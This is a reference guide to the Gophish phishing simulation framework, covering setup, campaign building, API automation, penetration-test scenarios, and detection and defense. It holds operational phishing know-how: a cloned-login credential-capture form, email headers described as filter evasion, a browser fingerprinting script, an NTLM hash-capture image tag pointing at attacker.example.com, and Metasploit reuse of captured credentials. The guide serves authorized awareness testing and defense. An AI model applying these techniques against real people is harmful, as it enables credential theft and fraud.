---
title: "Gophish"
category: "Initial Access"
tool_type: "Phishing Simulation Framework"
mitre_attack: ["TA0001: Initial Access", "T1566: Phishing"]
difficulty: "Beginner"
version: "0.12.1"
author: "Jordan Wright"
license: "MIT"
language: "Go"
install_method: "apt"
kali_package: "gophish"
official_url: "https://getgophish.com"
github_url: "https://github.com/gophish/gophish"
---

# Gophish — Open-Source Phishing Simulation Framework

## 1. Introduction & Overview

### What Is Gophish

Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly set up and execute phishing campaigns and security awareness training programs. Built in Go, it ships as a single binary with a web-based admin UI, email sending engine, and landing page server — everything needed to run a complete phishing engagement out of the box.

Unlike generic email tools, Gophish is purpose-built for phishing simulations. It tracks who opened emails, who clicked links, who submitted credentials, and provides detailed analytics per campaign. The admin panel is a full-featured dashboard showing real-time engagement metrics.

### History

- **Created:** 2012-2013 by Jordan Wright
- **License:** MIT
- **Language:** Go (61.5%), JavaScript (25.5%), HTML (11.9%)
- **Current Version:** 0.12.1 (September 2022)
- **Repository:** 14k stars, 2.9k forks, 815 commits
- **Kali Package:** Included in `default`, `everything`, and `large` metapackages
- **Dependencies:** adduser, kali-defaults, libc6, libsqlite3-0, sudo
- **Kali Services:** managed via systemd (`gophish.service`)
- **Default Credentials (Kali):** `admin` / `kali-gophish`

### When to Use

- **Security awareness training** — test and train employees against phishing
- **Penetration testing engagements** — phishing as an initial access vector
- **Incident response exercises** — simulate phishing to test detection and response
- **Compliance requirements** — organizations that must demonstrate phishing awareness
- **Internal security audits** — measure human vulnerability to social engineering
- **Red team operations** — realistic phishing campaign infrastructure

### When NOT to Use

- **Real phishing attacks** — this tool is for authorized testing only
- **Spam campaigns** — Gophish is not a mass-mailing tool for unsolicited email
- **Credential harvesting of real services** — use only with your own landing pages
- **Non-authorized testing** — written authorization is required

### Legal Considerations

Gophish is a legitimate security testing tool used by organizations worldwide for security awareness training and penetration testing. However:

1. **Written authorization is mandatory** — obtain explicit consent from the target organization's management
2. **Scope definition** — clearly define which employees, departments, or systems are in scope
3. **Data handling** — any credentials captured must be handled according to data protection laws (GDPR, CCPA, etc.)
4. **No real credential theft** — captured credentials should be used only for measurement, not actual access
5. **Reporting** — provide results to authorized stakeholders only

### Key Concepts

| Concept | Definition |
|---------|-----------|
| **Campaign** | A complete phishing exercise with targets, template, sending profile, and landing page |
| **Email Template** | The phishing email content, including HTML formatting and tracking URLs |
| **Landing Page** | The fake login page or website victims are directed to after clicking |
| **Sending Profile** | SMTP server configuration used to send phishing emails |
| **Tracking Pixel** | Invisible image embedded in emails to detect opens |
| **Group** | A collection of target email addresses |
| **Results Dashboard** | Real-time analytics showing opens, clicks, submissions per campaign |

---

## 2. Installation & Setup

### Requirements

- Kali Linux (or any Linux, macOS, Windows)
- SMTP server access (for sending emails)
- Port 3333 (admin UI) and 8080 (landing pages) available
- TLS certificate (recommended for HTTPS landing pages)
- Network access to the target email infrastructure

### Installation Methods

**From Kali repositories (recommended):**

```bash
sudo apt update && sudo apt install gophish
```

**Start the service:**

```bash
sudo gophish-start
```

**Stop the service:**

```bash
sudo gophish-stop
```

**From source:**

```bash
# Requires Go 1.10+
git clone https://github.com/gophish/gophish.git
cd gophish
go build
```

**Using Docker:**

```bash
docker pull gophish/gophish
docker run -p 3333:3333 -p 8080:8080 gophish/gophish
```

### Configuration

**Default config file location:** `/etc/gophish/config.json` (Kali package) or `config.json` in the source directory.

**Kali default credentials:**

| Setting | Value |
|---------|-------|
| Admin URL | `https://127.0.0.1:3333` |
| Username | `admin` |
| Password | `kali-gophish` |
| Landing page port | `8080` |

**First-time configuration:**

1. Start gophish: `sudo gophish-start`
2. Open browser to `https://127.0.0.1:3333`
3. Log in with default credentials
4. Change the admin password immediately
5. Configure an SMTP sending profile

### SMTP Configuration

Navigate to **Sending Profiles** in the admin UI and add your SMTP server:

| Field | Example Value |
|-------|--------------|
| Name | `Corporate SMTP` |
| SMTP Interface Host | `smtp.target.example.com` |
| SMTP Interface Port | `587` |
| Username | `phishing@target.example.com` |
| Password | `securepassword` |
| From Email | `security-alert@target.example.com` |
| From Name | `IT Security Team` |
| Ignore TLS Errors | No (unless testing self-signed certs) |

### Verification

```bash
# Check service status
sudo gophish-stop  # Shows service status in output

# Test the web UI is accessible
curl -k https://127.0.0.1:3333/

# Check the landing page server
curl http://127.0.0.1:8080/
```

---

## 3. Basic Usage

### First Run

```bash
sudo gophish-start
```

Output:

```
[*] Web UI: https://127.0.0.1:3333
[*] You might need to refresh your browser once it opens

  Default credentials:
    user: admin
    password: kali-gophish
```

### Essential Workflow

A complete phishing campaign involves four components:

**1. Create a Group (targets):**

Navigate to **Users & Groups** → **New Group**:

| Field | Value |
|-------|-------|
| Name | `Q3 Security Test - Engineering` |
| Targets | Upload CSV or add manually |

CSV format:

```
First Name,Last Name,Email,Position
John,Doe,john.doe@target.example.com,Developer
Jane,Smith,jane.smith@target.example.com,Manager
```

**2. Create an Email Template:**

Navigate to **Email Templates** → **New Template**:

| Field | Value |
|-------|-------|
| Name | `Password Reset Urgent` |
| From | `IT Security <security@target.example.com>` |
| Subject | `URGENT: Your password expires in 24 hours` |

HTML body (simplified):

```html
<p>Hi {{.FirstName}},</p>
<p>Your corporate password will expire in 24 hours. Please update it immediately to avoid account lockout.</p>
<p><a href="{{.URL}}">Click here to reset your password</a></p>
<p>Best regards,<br>IT Security Team</p>
```

**3. Create a Landing Page:**

Navigate to **Landing Pages** → **New Page**:

| Field | Value |
|-------|-------|
| Name | `Corporate SSO Login` |
| URL | `https://sso.target.example.com` |

Use the **Import Site** feature to clone the real login page, or build a custom HTML page. Enable **Capture Submitted Data** and **Capture Passwords** to record credentials.

**4. Create and Launch Campaign:**

Navigate to **Campaigns** → **New Campaign**:

| Field | Value |
|-------|-------|
| Name | `Q3 Engineering Phishing Test` |
| Email Template | `Password Reset Urgent` |
| Landing Page | `Corporate SSO Login` |
| Sending Profile | `Corporate SMTP` |
| Groups | `Q3 Security Test - Engineering` |
| Launch Date | Set desired date/time |
| Send Emails Now | Yes (or schedule) |

### Essential Commands

**Check campaign results via API:**

```bash
curl -k -H "Authorization: YOUR_API_KEY" \
  https://127.0.0.1:3333/api/campaigns/
```

**Explanation:** Returns JSON with all campaigns and their statistics.

**Export campaign results:**

```bash
curl -k -H "Authorization: YOUR_API_KEY" \
  https://127.0.0.1:3333/api/campaigns/1/results \
  -o results.json
```

**Explanation:** Exports detailed results for campaign ID 1, including open rates, click rates, and credential submissions.

**Import targets via CSV:**

```bash
curl -k -H "Authorization: YOUR_API_KEY" \
  -F "file=@targets.csv" \
  https://127.0.0.1:3333/api/import/group
```

**Explanation:** Bulk-imports target email addresses from a CSV file.

### Dashboard Overview

The admin dashboard displays:

- **Campaign List** — all campaigns with status (Queued, Sending, Completed)
- **Results Summary** — emails sent, opened, clicked, submitted credentials
- **Timeline** — chronological events per campaign
- **Detailed Results** — per-target breakdown with timestamps
- **Charts** — visual graphs of engagement metrics

### Flags Reference (CLI)

| Flag | Description |
|------|-------------|
| `-h, --help` | Show help |
| `-listen-url` | URL for the admin interface (default `https://0.0.0.0:3333`) |
| `-listen-url-plain` | URL for the landing page server (default `http://0.0.0.0:8080`) |
| `-admin-url` | Public URL for the admin interface |
| `-phish-url` | Public URL for the landing page server |
| `-config` | Path to config file |
| `-version` | Show version |
| `-disable-checkup` | Disable periodic checkup updates |

---

## 4. Intermediate Usage

### Custom Email Templates with Conditional Content

Gophish templates support Go templating:

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; }
        .btn { background: #0066cc; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Password Expiration Notice</h2>
        <p>Hello {{.FirstName}} {{.LastName}},</p>
        <p>Your password for <strong>{{.From}}</strong> will expire on {{.RidingDate}}.</p>
        <p>Please click the button below to update your credentials:</p>
        <p style="text-align: center;">
            <a href="{{.URL}}" class="btn">Update Password Now</a>
        </p>
        <p style="color: #666; font-size: 12px;">This is an automated message from the IT Department.</p>
    </div>
</body>
</html>
```

**Available template variables:**

| Variable | Description |
|----------|-------------|
| `{{.FirstName}}` | Target's first name |
| `{{.LastName}}` | Target's last name |
| `{{.Email}}` | Target's email address |
| `{{.Position}}` | Target's job position |
| `{{.URL}}` | Tracking URL (unique per target) |
| `{{.From}}` | Sender email address |
| `{{.RidingDate}}` | Scheduled campaign date |

### Landing Page Cloning

**Clone an existing site:**

1. Navigate to **Landing Pages** → **New Page**
2. Enter the URL of the real login page
3. Click **Import**
4. Gophish fetches and copies the HTML, CSS, and JavaScript
5. Add the `Gophish` tracking form action to capture submissions

**Modify the cloned page to capture credentials:**

```html
<!-- Original form action -->
<!-- <form action="https://real-sso.target.example.com/login"> -->

<!-- Gophish capture -->
<form action="{{.URL}}" method="POST">
    <input type="hidden" name="rid" value="{{.RID}}">
    <input type="text" name="username" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Sign In</button>
</form>
```

**Explanation:** The `{{.URL}}` and `{{.RID}}` placeholders ensure captured credentials are sent back to Gophish and associated with the correct target.

### Sending Profile Configuration

**Corporate SMTP (with TLS):**

```json
{
    "name": "Office 365 SMTP",
    "host": "smtp.office365.com",
    "port": 587,
    "username": "phishing@target.example.com",
    "password": "encrypted_password",
    "from": "security@target.example.com",
    "from_name": "IT Security",
    "ignore_cert_errors": false,
    "headers": {
        "X-Mailer": "Microsoft Outlook 16.0"
    }
}
```

**Custom headers for evasion:**

```json
{
    "headers": {
        "X-Mailer": "Microsoft Outlook 16.0",
        "X-Priority": "1",
        "X-MS-Mail-Priority": "High"
    }
}
```

**Explanation:** Custom headers make the email appear more legitimate and can bypass some email security filters that check for mail client identification.

### Campaign Scheduling

Schedule campaigns for maximum effectiveness:

- **Tuesday-Thursday, 9-11 AM** — highest email open rates
- **Avoid Monday mornings** — employees are catching up on emails
- **Avoid Friday afternoons** — reduced attention and engagement
- **Align with company events** — exploit tax season, security updates, policy changes

### Tracking Mechanisms

**Email open tracking:**

Gophish embeds an invisible 1x1 pixel image in each email:

```html
<img src="https://phish-server:8080/track?rid=UNIQUE_ID" width="1" height="1">
```

**Link click tracking:**

Each `{{.URL}}` in the template is replaced with a unique tracking URL:

```
https://phish-server:8080/rid?rid=UNIQUE_ID
```

**Credential submission:**

When a target submits the form on the landing page, Gophish captures:
- Email/username
- Password
- Timestamp
- IP address
- User-Agent string
- All form fields

---

## 5. Advanced Usage

### API Automation

Gophish exposes a REST API for full campaign automation:

**Generate API key:**

1. Log in to admin UI
2. Navigate to **Settings** → **Users**
3. Edit admin user → **Generate API Key**

**List all campaigns:**

```bash
curl -k -s -H "Authorization: YOUR_API_KEY" \
  https://127.0.0.1:3333/api/campaigns/ | python3 -m json.tool
```

**Create a campaign via API:**

```bash
curl -k -X POST \
  -H "Authorization: YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Automated Test Campaign",
    "template": {"id": 1},
    "page": {"id": 1},
    "smtp": {"id": 1},
    "groups": [{"id": 1}],
    "launch_date": "2026-07-20T09:00:00Z",
    "send_emails": true
  }' \
  https://127.0.0.1:3333/api/campaigns/
```

**Check campaign status:**

```bash
curl -k -s -H "Authorization: YOUR_API_KEY" \
  https://127.0.0.1:3333/api/campaigns/1 | python3 -c "
import json, sys
c = json.load(sys.stdin)
print(f'Campaign: {c[\"name\"]}')
print(f'Status: {c[\"status\"]}')
print(f'Results: {len(c[\"results\"])} targets')
"
```

**Export results for reporting:**

```bash
curl -k -s -H "Authorization: YOUR_API_KEY" \
  https://127.0.0.1:3333/api/campaigns/1/results | \
  python3 -c "
import json, sys, csv
results = json.load(sys.stdin)
writer = csv.writer(sys.stdout)
writer.writerow(['Email', 'Status', 'Submitted', 'Submitted Data'])
for r in results:
    writer.writerow([
        r['email'],
        r['status'],
        r.get('submitted', False),
        r.get('submitted_data', {})
    ])
" > campaign_results.csv
```

### Python Client Library

```bash
pip3 install gophish
```

```python
from gophish import Gophish

api = Gophish('YOUR_API_KEY', host='https://127.0.0.1:3333', verify=False)

# List campaigns
campaigns = api.campaigns.get()
for c in campaigns:
    print(f"{c.name}: {c.status}")

# Create campaign
from gophish.models import Campaign, Template, Page, SMTP, Group
campaign = Campaign(
    name="Automated Campaign",
    template=Template(id=1),
    page=Page(id=1),
    smtp=SMTP(id=1),
    groups=[Group(id=1)]
)
result = api.campaigns.post(campaign)
print(f"Created campaign: {result.id}")
```

### Multi-Phase Campaigns

Run progressive phishing campaigns to measure improvement:

**Phase 1 — Baseline (Week 1):**

```bash
# Simple credential harvest
curl -k -X POST -H "Authorization: KEY" \
  -H "Content-Type: application/json" \
  -d '{"name":"Phase 1 - Baseline","template":{"id":1},"page":{"id":1},"smtp":{"id":1},"groups":[{"id":1}],"launch_date":"2026-07-20T09:00:00Z"}' \
  https://127.0.0.1:3333/api/campaigns/
```

**Phase 2 — After Training (Week 4):**

```bash
# More sophisticated pretext
curl -k -X POST -H "Authorization: KEY" \
  -H "Content-Type: application/json" \
  -d '{"name":"Phase 2 - Post Training","template":{"id":2},"page":{"id":2},"smtp":{"id":1},"groups":[{"id":1}],"launch_date":"2026-08-10T09:00:00Z"}' \
  https://127.0.0.1:3333/api/campaigns/
```

**Measure improvement** by comparing click/submission rates between phases.

### Custom Landing Pages with JavaScript Payloads

Beyond credential capture, landing pages can deliver additional payloads:

```html
<!-- Clone the real login page, then add -->
<script>
// Capture additional browser information
var info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    plugins: Array.from(navigator.plugins).map(p => p.name),
    languages: navigator.languages,
    screen: { width: screen.width, height: screen.height }
};

// Exfiltrate to Gophish (already captured via form)
document.cookie = "fingerprint=" + btoa(JSON.stringify(info));
</script>
```

### Integration with Other Tools

**Gophish + Metasploit:**

After a successful phishing campaign, use captured credentials for initial access:

```bash
# Use captured credentials with Metasploit
msfconsole -q
use auxiliary/scanner/smb/smb_login
set SMBUser captured_user
set SMBPass captured_password
set RHOSTS 192.168.1.50
run
```

**Gophish + Responder:**

For internal phishing that captures NTLM hashes:

```bash
# Set up Responder to capture hashes
responder -I eth0 -wrf

# Modify landing page to force NTLM auth
<img src="\\attacker.example.com\share">
```

### Docker Deployment

```bash
# Run with persistent data
docker run -d \
  --name gophish \
  -p 3333:3333 \
  -p 8080:8080 \
  -v /opt/gophish/data:/opt/gophish/data \
  gophish/gophish

# View logs
docker logs -f gophish
```

**Docker Compose:**

```yaml
version: '3'
services:
  gophish:
    image: gophish/gophish
    ports:
      - "3333:3333"
      - "8080:8080"
    volumes:
      - ./data:/opt/gophish/data
    restart: unless-stopped
```

---

## 6. Real-World Scenarios

### Scenario 1: Corporate Security Awareness Assessment

A 500-person company needs to establish a baseline phishing susceptibility metric before launching a training program.

**Step 1 — Import targets:**

```bash
# Create CSV with all employees
# employees.csv: First Name,Last Name,Email,Department
```

Upload via admin UI: **Users & Groups** → **New Group** → **Upload CSV**

**Step 2 — Design the campaign:**

- **Template:** Password reset from "IT Department" with company branding
- **Landing page:** Clone of corporate SSO login page
- **Sending profile:** Company's Office 365 SMTP relay
- **Schedule:** Tuesday 10:00 AM

**Step 3 — Execute and measure:**

```bash
# After campaign completes, export results
curl -k -s -H "Authorization: KEY" \
  https://127.0.0.1:3333/api/campaigns/1/results | \
  python3 -c "
import json, sys
results = json.load(sys.stdin)
opened = sum(1 for r in results if r['status'] == 'Email Opened')
clicked = sum(1 for r in results if r['status'] == 'Clicked Link')
submitted = sum(1 for r in results if r.get('submitted'))
total = len(results)
print(f'Open Rate: {opened/total*100:.1f}%')
print(f'Click Rate: {clicked/total*100:.1f}%')
print(f'Submission Rate: {submitted/total*100:.1f}%')
"
```

**Expected metrics for baseline:**
- Open rate: 30-60%
- Click rate: 10-30%
- Submission rate: 5-15%

### Scenario 2: Penetration Test — Phishing as Initial Access

During an external penetration test, the goal is to gain access to the corporate network via phishing.

**Step 1 — Reconnaissance:**

```bash
# Harvest email addresses from LinkedIn, company website, data breaches
# Identify email format: firstname.lastname@target.example.com
# Find SMTP server: MX record lookup
dig MX target.example.com
```

**Step 2 — Craft targeted email:**

```
Template: "Action Required: VPN Configuration Update"
Pretext: Corporate VPN client requires update; includes "installer" link
Landing page: Fake VPN download page with credential capture + payload delivery
```

**Step 3 — Execute:**

```bash
# Launch campaign targeting IT department (most likely to have elevated privileges)
# Schedule for Wednesday 10:30 AM
```

**Step 4 — Post-exploitation:**

```bash
# Use captured credentials for VPN access
# Or deliver malicious payload via landing page download link
# Combine with Metasploit for reverse shell
```

### Scenario 3: Bug Bounty — Phishing Resistance Assessment

A bug bounty program includes phishing resistance testing. The scope allows sending phishing emails to employees.

**Step 1 — Create minimal campaign:**

- **Template:** Simple "Verify your account" email
- **Landing page:** Minimal page that only captures User-Agent (no real credentials)
- **Group:** 50 pre-approved employees

**Step 2 — Measure results:**

```bash
# Focus on click-through rate as the primary metric
# No credential capture (bug bounty scope)
# Document everything for the report
```

**Step 3 — Report findings:**

Document the phishing susceptibility rate, specific employees who clicked (with their permission), and recommend training improvements.

### Scenario 4: Compliance Audit — Annual Phishing Test

An organization must demonstrate annual phishing awareness testing for PCI-DSS compliance.

**Step 1 — Schedule quarterly campaigns:**

```bash
# Q1: Basic credential harvest
# Q2: Spear-phishing with attachment
# Q3: CEO fraud / business email compromise
# Q4: SMS phishing (smishing) via landing page
```

**Step 2 — Track improvement:**

```bash
# Compare metrics across quarters
# Q1: 25% click rate
# Q2: 18% click rate
# Q3: 12% click rate
# Q4: 8% click rate
```

**Step 3 — Document for auditors:**

Export campaign results and generate compliance report showing year-over-year improvement.

---

## 7. Detection & Defense

### How to Detect Gophish Campaigns

**Email-level detection:**

1. **Tracking pixel detection** — block or alert on 1x1 pixel images from external servers
2. **Link analysis** — check for redirected URLs pointing to non-corporate domains
3. **Email header anomalies** — custom X-Mailer headers, unusual sending patterns
4. **SPF/DKIM/DMARC** — properly configured email authentication blocks spoofed emails

**Network-level detection:**

```bash
# Monitor DNS for phishing domains
tcpdump -i eth0 port 53 -n | grep -E "phish|fake"

# Alert on landing page server connections
iptables -A OUTPUT -d PHISH_SERVER_IP -j LOG --log-prefix "Gophish: "
```

**Browser-level detection:**

```javascript
// Check for cloned login pages
if (window.location.hostname !== "real-sso.target.example.com") {
    // Potential phishing page
    alert("This may not be the real login page");
}
```

### Mitigation Strategies

1. **Email authentication** — implement SPF, DKIM, and DMARC
2. **Email filtering** — deploy anti-phishing email gateways
3. **Browser security** — enable Safe Browsing, block known phishing sites
4. **Multi-factor authentication** — prevents credential theft even if phishing succeeds
5. **Security awareness training** — regular phishing simulation and training
6. **Incident response plan** — clear procedures for reporting suspicious emails
7. **URL reputation checking** — integrate with threat intelligence feeds
8. **Certificate transparency monitoring** — detect new domains mimicking your brand

### Recommended Detection Tools

- **DMARC analyzer** — monitor email authentication failures
- **URLScan.io** — analyze suspicious URLs before clicking
- **PhishTank** — community-reported phishing site database
- **Email security gateways** — Proofpoint, Mimecast, Microsoft Defender for Office 365

### Enterprise Defense Configuration

```bash
# DMARC policy (in DNS TXT record)
_dmarc.target.example.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@target.example.com"

# SPF record
target.example.com TXT "v=spf1 include:_spf.google.com -all"

# Block known phishing IPs at firewall
iptables -A INPUT -s PHISH_SERVER_IP -j DROP
```

---

## 8. Troubleshooting

### Common Errors

**"bind: address already in use" on port 3333:**

```bash
# Check what's using the port
sudo ss -tlnp | grep 3333

# Kill the process or change the port
sudo gophish-stop
# Edit config.json to change admin_listen_url
sudo gophish-start
```

**TLS certificate errors:**

```bash
# Generate self-signed certificate for testing
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Or use Let's Encrypt for production
certbot certonly --standalone -d phish.target.example.com
```

**Emails not sending:**

```bash
# Test SMTP connectivity
telnet smtp.target.example.com 587

# Check Gophish logs for SMTP errors
sudo journalctl -u gophish -f

# Verify sending profile credentials
# Common issues: wrong port, TLS required but not configured, authentication failure
```

**Landing page not loading:**

```bash
# Check if port 8080 is accessible
curl http://127.0.0.1:8080/

# Verify firewall rules
sudo iptables -L -n | grep 8080

# Check Gophish config for correct listen URL
cat /etc/gophish/config.json | python3 -m json.tool
```

**Tracking not working:**

- Ensure the tracking URL in emails points to the correct Gophish server
- Check that the landing page server is accessible from the target network
- Verify the `rid` parameter is being captured correctly
- Test with a known-good email address first

**Campaign stuck in "Queued" state:**

```bash
# Check if the launch date has passed
# Verify SMTP sending profile is working
# Check Gophish logs for send errors
sudo journalctl -u gophish --since "1 hour ago"
```

### FAQ

**Q: Can Gophish send emails without an SMTP server?**
A: No. Gophish requires an SMTP server to send emails. You can use corporate SMTP, Gmail SMTP, or any email provider.

**Q: Does Gophish support SMS phishing?**
A: Not natively. Gophish is email-focused. For SMS phishing, use tools like `setoolkit` or custom Twilio integration.

**Q: How do I test without actually sending emails?**
A: Use the "Send Test Email" feature in the email template editor, or set up a local SMTP server (e.g., `mailhog` or `smtp4dev`) for testing.

**Q: Can Gophish capture MFA tokens?**
A: Gophish captures whatever the user submits on the landing page. If you build a landing page that requests an MFA code, it will be captured — but this requires more sophisticated landing page design.

**Q: Is Gophish detectable by email security tools?**
A: Gophish is detectable by sophisticated email security gateways. To improve deliverability, use a reputable SMTP service, configure SPF/DKIM properly, and customize email headers.

---

## Resources

- [Gophish Official Documentation](https://docs.getgophish.com/)
- [Gophish User Guide](https://docs.getgophish.com/user-guide/)
- [Gophish API Documentation](https://docs.getgophish.com/api-documentation/)
- [Python API Client](https://docs.getgophish.com/python-api-client/)
- [GitHub Repository](https://github.com/gophish/gophish)
- [Kali Package Page](https://www.kali.org/tools/gophish/)
- [MITRE ATT&CK T1566](https://attack.mitre.org/techniques/T1566/)
- [OWASP Phishing](https://owasp.org/www-community/attacks/Phishing)
- [NIST SP 800-50: Building an IT Security Awareness Program](https://csrc.nist.gov/publications/detail/sp/800-50/rev-1/final)
